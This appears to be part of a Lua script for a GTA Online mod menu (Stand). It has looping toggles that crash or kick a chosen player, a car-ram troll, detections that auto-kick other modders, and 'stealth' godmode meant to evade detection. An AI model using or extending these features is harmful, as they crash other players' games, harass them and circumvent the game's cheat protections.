        	menu.toggle(crash, "Block Player", {"block"}, "Shortcut to blocking the player join reaction ", function()
        	notification("Blocked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            	menu.trigger_commands("historyblock" .. players.get_name(pid))
    			end)

	menu.toggle(acams, "Panic Mode", {"panicmode"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	menu.divider(crash, "Stand Crashes")

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(crash, "Elegant", {"crash"}, "Blocked by most menus.", function(on_loop)
            menu.trigger_commands("crash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(crash, "Next-Gen", {"ngcrash"}, "Blocked by popular menus.", function(on_loop)
            menu.trigger_commands("ngcrash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(crash, "Steamroller", {"steamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
            menu.trigger_commands("steamroll" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(crash, "Burger King Foot Lettuce", {"footlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
            menu.trigger_commands("footlettuce" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(crash, "Vehicular Manslaughter", {"slaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
            menu.trigger_commands("slaughter" .. players.get_name(pid))
        end)
    end

	menu.action(crash, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		end
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end)

	menu.action(troll_sub_vehicle_tab, "Car Ram", {"ram"}, "Don't drink and drive, folks", function()
    	notification("Ram that bitch!!! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
		util.yield(5000)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
	end)

end

misc = menu.list(menu.my_root(), "Net Shit", {}, "", function(); end)

--------------------------------------


local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end

local unreleased_vehicles = {
    "Rhinehart",
    "Sentinel4",
    "Weevil2",
    "tenf2",
}

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}

local proofs = {
    bullet = {name="Bullets",on=false},
    fire = {name="Fire",on=false},
    explosion = {name="Explosions",on=false},
    collision = {name="Collision",on=false},
    melee = {name="Melee",on=false},
    steam = {name="Steam",on=false},
    drown = {name="Drowning",on=false},
}


local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local self = menu.list(menu.my_root(), "Protections", {}, "")
local detections = menu.list(menu.my_root(), "Modder Detections", {}, "")

local proofsList = menu.list(self, "Godmode Editor", {}, "")
local immortalityCmd = menu.ref_by_path("Self>Immortality")
for _,data in pairs(proofs) do
    menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "Makes you invulnerable to "..data.name:lower()..".", function(toggle)
        data.on = toggle
    end)
end
util.create_tick_handler(function()
    local player = players.user_ped()
    if not menu.get_value(immortalityCmd) then
        ENTITY.SET_ENTITY_PROOFS(player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
    end
end)

menu.toggle_loop(self, "Ghost PvP Players", {}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_FREE_AIMING(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else 
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end)

local ghost = false
local ghostCmd
local ghostCmd = menu.toggle(self, "Auto Ghost Godmode Players", {}, "", function(toggle)
    ghost = toggle

    if not ghost then
        for _, pid in ipairs(players.list(false, true, true)) do
            NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid, false)
        end
    return end


    while ghost do 
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            for i, interior in ipairs(interior_stuff) do
                if (players.is_godmode(pid) or not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                    NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid, true)
                    break
                end
            end
        end 
        util.yield()
    end
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode On", {}, "Won't be detected as vehicle godmode by most menus. Note: Save your profile now to keep it on.", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode Off", {}, "Turns off Godmode for the vehicle", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), false, false, false, false, false, 0, 0, false)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), true), true, true, true, true, true, 0, 0, true)
end)


local gdmedits = menu.list(detections, "Godmode", {}, "")
menu.toggle_loop(gdmedits, "Godmode", {}, "Detects if someone is using godmode.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. " Is In Godmode")
                break
            end
        end
    end 
end)

menu.toggle_loop(gdmedits, "Godmode Auto Kick", {}, "Detects if someone is using godmode, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
            menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is In Godmode")
                util.toast(players.get_name(pid) .. "Is In Godmode")
                break
            end
        end
    end 
end)

local vehgdm = menu.list(detections, "Vehicle Godmode", {}, "")
menu.toggle_loop(vehgdm, "Vehicle Godmode", {}, "Detects if someone is using a vehicle that is in godmode.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "  Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Kick", {}, "Detects if someone is using a vehicle that is in godmode, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("blast" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Slingshot", {}, "Detects if someone is using a vehicle that is in godmode, then slingshots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Kick Them Out", {}, "Detects if someone is using a vehicle that is in godmode, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

local unrelveh = menu.list(detections, "Unreleased Vehicle", {}, "")
menu.toggle_loop(unrelveh, "Unreleased Vehicle", {}, "Detects if someone is using a vehicle that has not been released yet.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Vehicle Auto Kick", {}, "Detects if someone is using a vehicle that has not been released yet, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Car Auto Slingshot", {}, "Detects if someone is using a vehicle that has not been released yet, then slingshots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Car Auto Kick Them Out", {}, "Detects if someone is using a vehicle that has not been released yet, then Kicks them out.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

local modwep = menu.list(detections, "Modded Weapon", {}, "")
menu.toggle_loop(modwep, "Modded Weapon", {}, "Detects if someone is using a weapon that can not be obtained in online.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modwep, "Modded Weapon Auto Kick", {}, "Detects if someone is using a weapon that can not be obtained in online, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modwep, "Modded Weapon Auto Disarm", {}, "Detects if someone is using a weapon that can not be obtained in online, then disarms them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                menu.trigger_commands("disarm" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

local modveh = menu.list(detections, "Modded Vehicle", {}, "")
menu.toggle_loop(modveh, "Modded Vehicle", {}, "Detects if someone is using a vehicle that can not be obtained in online.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Kick", {}, "Detects if someone is using a vehicle that can not be obtained in online, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Slingshot", {}, "Detects if someone is using a vehicle that can not be obtained in online, then slingshots vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Kick Them Out", {}, "Detects if someone is using a vehicle that can not be obtained in online, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)


local detsuperd = menu.list(detections, "Super Drive", {}, "")
menu.toggle_loop(detsuperd, "Super Drive", {}, "Detects if the player is using super drive.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Kick", {}, "Detects if the player is using super drive, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("blast" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Slingshot", {}, "Detects if the player is using super drive, then slinghsots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("slingshot" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Kick Them Out", {}, "Detects if the player is using super drive, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("vehkick" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

--------------------------------------

focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

function save()
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..teamchatlabel..'"'..string.char(10)..'allchatlabel = "'..allchatlabel..'"')
	configfile:close()
end


if not filesystem.exists(filesystem.store_dir().."chat_translator//config.txt") then
	filesystem.mkdir(filesystem.store_dir().."chat_translator//")
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..util.get_label_text("MP_CHAT_TEAM")..'"'..string.char(10)..'allchatlabel = "'..util.get_label_text("MP_CHAT_ALL")..'"')
	configfile:close()
	colorselec = 1
else
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt")
	configfiledata = configfile:read("*all")
	configfile:close()
	load(configfiledata)()
end
util.ensure_package_is_installed("lua/ScaleformLib")
local sfchat = require("lib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()

local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end


local maxpl = menu.list(misc, "Max Players To 32")

menu.slider(maxpl, "Max Players To 32", {"maxplayers"}, "Set the maximum number of players in a session (only works when you are the host)", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
       util.toast("Slots are now free :)")
    end
end)
menu.slider(maxpl, "Max Spectators", {"maxSpectators"}, "Set the maximum number of observers (only works when you are the host)", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("Slots are now free :)")
    end
end)


local chat_trans = menu.list(misc, "Chat Translator")

settingtrad = menu.list(chat_trans, "Settings for traduction")
colortradtrad = menu.list(chat_trans, "PLayer name color")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
